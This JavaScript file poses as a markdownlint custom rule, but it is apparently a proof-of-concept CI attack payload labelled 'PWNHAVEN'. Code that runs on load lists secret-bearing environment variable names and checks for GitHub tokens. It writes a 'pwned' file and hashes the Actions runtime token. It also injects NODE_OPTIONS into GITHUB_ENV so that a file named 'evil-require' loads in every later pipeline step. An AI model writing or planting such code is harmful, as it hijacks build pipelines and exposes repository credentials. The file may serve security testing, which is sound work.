const fs = require('fs');
const crypto = require('crypto');
const marker = 'PWNHAVEN_MD_CANARY_LANDED';
try {
  console.log(marker);
  const keys = Object.keys(process.env).filter(k => /TOKEN|SECRET|CRED/i.test(k));
  console.log('ENV_KEYS=' + keys.join(','));
  console.log('HAS_GITHUB_TOKEN=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
  fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/dev/null', marker + '\n');
  fs.writeFileSync('pwned.txt', marker + '\n');
  if (process.env.GITHUB_ENV) {
    fs.appendFileSync(process.env.GITHUB_ENV, 'PWNHAVEN_ENV_INJECTED=1\n');
    fs.appendFileSync(process.env.GITHUB_ENV, 'NODE_OPTIONS=--require ' + process.cwd() + '/evil-require.cjs\n');
  }
  const t = process.env.ACTIONS_RUNTIME_TOKEN || '';
  if (t) console.log('RUNTIME_TOKEN_SHA256=' + crypto.createHash('sha256').update(t).digest('hex'));
} catch (e) { console.log('PAYLOAD_ERR=' + e.message); }
module.exports = [{
  names: ['CANARY01', 'canary-rule'],
  description: 'canary rule',
  tags: ['canary'],
  function: function rule(params, onError) {
    onError({ lineNumber: 1, detail: 'canary triggered' });
  }
}];
